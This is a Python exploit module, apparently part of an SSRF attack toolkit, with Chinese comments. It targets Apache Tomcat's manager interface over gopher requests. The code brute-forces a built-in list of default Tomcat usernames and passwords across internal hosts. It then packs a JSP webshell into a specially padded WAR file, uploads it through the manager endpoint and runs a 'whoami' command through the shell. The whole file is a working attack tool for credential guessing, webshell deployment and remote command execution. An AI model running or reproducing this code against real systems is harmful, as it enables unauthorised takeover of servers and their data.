import argparse
import base64
import binascii
import getopt
import logging
import re
import sys
import urllib
import zipfile

from core.utils import *

# 注意
# 此利用代码是 Pimps 脚本的 Python 3 版本
# 附带一个简单的爆破器和自动利用器
# https://github.com/pimps/gopher-tomcat-deployer

name = "tomcat"
description = "Tomcat - 爆破管理后台并上传 WAR 包"
author = "Swissky"
documentation = [
    "https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html",
    "https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown",
    "https://github.com/pimps/gopher-tomcat-deployer",
]


class exploit:
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = "8888"
    SERVER_TOMCAT = "manager/html"
    SERVER_USER = "tomcat"
    SERVER_PASS = "tomcat"
    EXPLOIT_JSP = "data/cmd.jsp"
    EXPLOIT_WAR = "/tmp/cmd.war"
    tomcat_user = ["tomcat", "admin", "both", "manager", "role1", "role", "root"]
    tomcat_pass = [
        "password",
        "tomcat",
        "admin",
        "manager",
        "role1",
        "changethis",
        "changeme",
        "r00t",
        "root",
        "s3cret",
        "Password1",
        "password1",
    ]

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")
        self.args = args

        # 使用生成器创建主机列表
        gen_host = gen_ip_list(self.SERVER_HOST, args.level)
        for ip in gen_host:
            for usr in self.tomcat_user:
                for pss in self.tomcat_pass:
                    payload = wrapper_http(
                        self.SERVER_TOMCAT, ip, self.SERVER_PORT, usernm=usr, passwd=pss
                    )
                    r = requester.do_request(args.param, payload)

                    if r != None and not "s3cret" in r.text:
                        logging.info(f"发现凭据 \033[32m{usr}\033[0m:\033[32m{pss}\033[0m")
                        self.SERVER_USER = usr
                        self.SERVER_PASS = pss

                        # 为生成合法的 zip 文件而进行爆破填充
                        # 这是最差的方案，直到我找到替代方法
                        # 来转换原始 Python 2 payload 中的 is_ascii
                        for i in range(5):
                            payload = self.send_war(i)
                            r = requester.do_request(args.param, payload)

                            if args.verbose == True:
                                logging.info(f"生成的 payload : {payload}")

                            logging.info(f"向 cmd.jsp 发送 CMD 命令以进行填充: {i}")
                            payload = wrapper_http(
                                "cmd/cmd.jsp?cmd=whoami", self.SERVER_HOST, self.SERVER_PORT
                            )
                            r = requester.do_request(args.param, payload)
                            if r.text != None and r.text != "":
                                logging.info(r.text)
                        break

    def send_war(self, padding):
        with open(self.EXPLOIT_JSP, "r") as f:
            webshell_data = f.read()
            webshell_data = self.validate_webshell_length_and_crc32(webshell_data + " " * padding)

            if self.args.verbose == True:
                logging.info("[+] 正在创建新的 zip 文件: " + self.EXPLOIT_WAR)
            self.create_war_zip_file(self.EXPLOIT_WAR, self.EXPLOIT_JSP, webshell_data)

            if self.args.verbose == True:
                logging.info("[+] 已生成有效的 WAR 文件... 正在构造 gopher payload...")
            gopher_payload = self.build_gopher_payload()

            return wrapper_gopher(gopher_payload, self.SERVER_HOST, self.SERVER_PORT)

    def create_war_zip_file(self, war_filename, inputfile, webshell_data):
        warzip = zipfile.ZipFile(war_filename, "w")
        # 写入一个已知安全的时间戳/文件名
        # 该日期时间不包含任何无效字节值
        info = zipfile.ZipInfo(inputfile, date_time=(1980, 1, 1, 0, 0, 0))
        # 将 webshell 写入 zip 文件。
        warzip.writestr(info, webshell_data)
        warzip.close()

    def validate_webshell_length_and_crc32(self, webshell_data):
        valid_length = 0
        valid_crc32 = 0
        modded_length = 0

        if self.args.verbose == True:
            logging.info(f"原始文件长度: {len(webshell_data):08X}")
            logging.info(
                f"原始文件 crc32: {binascii.crc32(webshell_data.encode()) & 0xFFFFFFFF:x}"
            )

        while valid_length == 0 or valid_crc32 == 0:
            crc_string = f"{binascii.crc32(webshell_data.encode()) & 0xFFFFFFFF:x}"
            ws_len_byte_string = f"{len(webshell_data):08X}"
            valid_length = 1
            valid_crc32 = 1
            lead_byte_locations = [0, 2, 4, 6]
            for x in lead_byte_locations:
                try:
                    if (
                        ws_len_byte_string[x] == "8"
                        or ws_len_byte_string[x] == "9"
                        or crc_string[x] == "8"
                        or crc_string[x] == "9"
                    ):
                        webshell_data = webshell_data + " "
                        valid_length = 0
                        valid_crc32 = 0
                        modded_length = modded_length + 1
                except:
                    continue

        if modded_length > 0:
            logging.info("输入文件的 CRC32 或文件长度包含无效字节。")
            logging.info(
                "长度调整完成。"
                + str(modded_length)
                + " 个空格字符已添加到 webshell 输入中。"
            )
            logging.info(f"新文件长度: {len(webshell_data):08X}")
            logging.info(f"新文件 crc32: {binascii.crc32(webshell_data.encode()) & 0xFFFFFFFF:x}")
        return webshell_data

    def url_encode_all(self, string):
        return "".join([f"%{ord(char):0>2x}" for char in string])

    def build_gopher_payload(self):
        warfile = ""
        with open(self.EXPLOIT_WAR, "rb") as f:
            warfile = f.read()

        headers = "POST /manager/html/upload HTTP/1.1\r\n"
        headers += "Host: {host}:{port}\r\n"
        headers += "Content-Type: multipart/form-data; boundary=---------------------------1510321429715549663334762841\r\n"
        headers += "Content-Length: {contentlength}\r\n"
        headers += "Authorization: Basic {credential}\r\n"
        headers += "Connection: close\r\n"
        headers += "Upgrade-Insecure-Requests: 1\r\n"
        headers += "\r\n"
        headers += "{content_body}"

        content = "-----------------------------1510321429715549663334762841\r\n"
        content += 'Content-Disposition: form-data; name="deployWar"; filename="{filename}"\r\n'
        content += "Content-Type: application/octet-stream\r\n"
        content += "\r\n"
        content += "{warfile}\r\n"
        content += "-----------------------------1510321429715549663334762841--\r\n"

        content_body = content.format(filename=self.EXPLOIT_WAR, warfile=warfile)
        payload = headers.format(
            host=self.SERVER_HOST,
            port=self.SERVER_PORT,
            credential=base64.b64encode((self.SERVER_USER + ":" + self.SERVER_PASS).encode()),
            contentlength=len(content_body),
            content_body=content_body,
        )
        return self.url_encode_all(payload)
